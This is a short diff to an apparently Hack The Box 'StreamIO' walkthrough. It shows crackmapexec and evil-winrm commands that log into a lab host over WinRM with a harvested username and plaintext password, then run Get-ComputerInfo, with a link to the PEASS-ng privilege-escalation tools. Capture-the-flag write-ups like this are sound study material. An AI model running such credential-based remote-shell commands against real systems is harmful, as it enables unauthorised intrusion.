@@ -240,10 +240,13 @@ crackmapexec winrm 10.10.11.158 -u nikk37 -p 'get_dem_girls2@yahoo.com'
 
 ![image](https://github.com/regarmulia/HTB/assets/33616880/36eeeecf-6b91-4d35-8485-602a4c2c4292)
 
-
+```
 evil-winrm -i streamIO.htb -u nikk37 -p get_dem_girls2@yahoo.com
+Get-ComputerInfo
+```
 ![image](https://user-images.githubusercontent.com/33616880/231686295-621f2f18-be32-4e7e-90af-b0dada0b1254.png)
 
+![image](https://github.com/regarmulia/HTB/assets/33616880/c9c20970-b530-423f-b821-8cea36faca5e)
 
 
 https://github.com/carlospolop/PEASS-ng/releases
